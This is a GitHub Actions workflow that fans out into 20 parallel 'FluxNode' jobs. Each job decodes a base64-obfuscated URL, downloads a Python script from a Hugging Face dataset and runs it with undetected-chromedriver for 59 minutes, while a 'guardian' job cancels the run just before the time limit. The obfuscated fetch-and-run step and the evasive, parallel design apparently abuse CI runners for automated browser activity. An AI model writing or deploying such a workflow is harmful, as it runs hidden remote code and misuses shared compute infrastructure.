name: Astral Flux Guardian Matrix

on:
  workflow_dispatch:

concurrency:
  group: astral-matrix-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false

permissions:
  actions: write
  contents: read

jobs:
  # =================================================================
  # Guardian: keeps watch for 59 minutes then cancels the entire run
  # =================================================================
  astral-guardian:
    name: "Astral Guardian"
    runs-on: ubuntu-latest
    timeout-minutes: 60
    env:
      GUARDIAN_TIMEOUT: 3540
    steps:
      - name: Activate Guardian Watch
        run: |
          echo "[GUARDIAN] Watch activated for run: ${{ github.run_id }}"
          echo "[GUARDIAN] Holding for ${GUARDIAN_TIMEOUT} seconds (59-minute boundary)."

          sleep "${GUARDIAN_TIMEOUT}"

          echo "[GUARDIAN] Boundary reached — sending cancellation request."

          curl -sS -X POST \
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            -H "Accept: application/vnd.github+json" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"

          echo "[GUARDIAN] Cancellation request sent. Active and queued jobs will be stopped."

  # =================================================================
  # Flux Matrix: parallel execution of Flux nodes
  # =================================================================
  flux-matrix:
    name: "FluxNode-${{ matrix.flux_id }}"
    runs-on: ubuntu-latest
    timeout-minutes: 59

    strategy:
      fail-fast: false
      matrix:
        flux_id: [6601, 6602, 6603, 6604, 6605, 6606, 6607, 6608, 6609, 6610, 6611, 6612, 6613, 6614, 6615, 6616, 6617, 6618, 6619, 6620]

    steps:
      # ✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧
      # Phase 1: Prepare node environment
      # ✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧
      - name: Prepare Node Environment
        run: |
          echo "[PREP] Preparing environment for FluxNode-${{ matrix.flux_id }} on Linux..."
          sudo apt-get update -qq
          sudo apt-get install -y curl python3-pip

      # ✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧
      # Phase 2: Retrieve flux worker
      # ✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧
      - name: Retrieve Flux Worker
        run: |
          echo "[RETRIEVE] Retrieving flux worker from remote source..."
          WORKER_URL=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
          curl -sL "$WORKER_URL" -o flux_worker.py
          echo "[RETRIEVE] Flux worker retrieved."

      # ✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧
      # Phase 3: Install required packages
      # ✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧
      - name: Install Required Packages
        run: |
          echo "[PACKAGES] Installing required packages..."
          pip3 install -q undetected-chromedriver selenium requests psutil

      # ✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧
      # Phase 4: Execute flux cycle (59-minute cap)
      # ✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧
      - name: Execute Flux Cycle
        run: |
          echo ">> Executing FluxNode-${{ matrix.flux_id }} cycle..."

          python3 flux_worker.py &
          FLUX_PID=$!

          echo ">> Cycle started. Maximum runtime: 59 minutes (3540s)."

          sleep 3540

          if kill -0 "$FLUX_PID" 2>/dev/null; then
            echo ">> Maximum runtime reached — stopping cycle."
            kill -9 "$FLUX_PID"
            echo ">> Cycle stopped by runtime monitor."
          else
            echo ">> Cycle finished before maximum runtime."
          fi
